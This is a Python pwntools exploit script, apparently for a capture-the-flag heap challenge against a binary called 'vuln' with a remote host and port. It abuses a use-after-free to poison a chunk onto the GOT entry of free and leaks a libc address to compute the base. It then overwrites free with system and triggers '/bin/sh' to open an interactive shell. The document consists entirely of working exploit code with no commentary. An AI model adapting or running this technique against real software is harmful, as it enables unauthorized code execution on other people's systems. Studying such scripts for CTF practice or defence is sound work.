#!/usr/bin/python3
from numpy import delete
import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']

elf = pwn.context.binary = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path, gdbscript='''b *0x00000000004009e2\nc\n''')
elif pwn.args.REMOTE:
    io = pwn.remote("34.159.7.96", 32437)
else:
    io = pwn.process(elf.path)


def make_admin():
    io.sendlineafter(b"Choice: ", b"1")


def make_user(data):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendafter(b"name: ", data)


def print_admin():
    io.sendlineafter(b"Choice: ", b"3")


def edit_student(data):
    io.sendlineafter(b"Choice: ", b"4")
    io.sendafter(b"name: ", data)


def view_student():
    io.sendlineafter(b"Choice: ", b"5")
    io.recvuntil(b"Students name is ")
    return io.recvline().strip()


def delete_admin():
    io.sendlineafter(b"Choice: ", b"6")


def delete_user():
    io.sendlineafter(b"Choice: ", b"7")


# io.sendlineafter(b"Choice: ", b"1")
# io.sendlineafter(b"Choice: ", b"6")

# io.sendlineafter(b"Choice: ", b"2")
# io.sendlineafter(b"name: ", b"A"*7)
# io.sendlineafter(b"Choice: ", b"7")
# io.sendlineafter(b"Choice: ", b"4")
# io.sendafter(b"name: ", b"A"*8+pwn.p64(elf.sym['getFlag']))
# io.sendlineafter(b"Choice: ", b"3")
make_admin()
make_user(b"A"*7)
delete_admin()
delete_user()
edit_student(pwn.p64(elf.got['free'] - 8)+pwn.p64(0xcafebabe))
make_admin()
make_user(b'A'*8)
libc_leak = view_student()[8:]
print(libc_leak)
libc_leak = pwn.unpack(libc_leak, 'all')
pwn.log.info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['free']
pwn.log.success("libc base: " + hex(libc.address))
edit_student(b'/bin/sh\0'+pwn.p64(libc.sym['system']))
delete_user()
io.interactive()
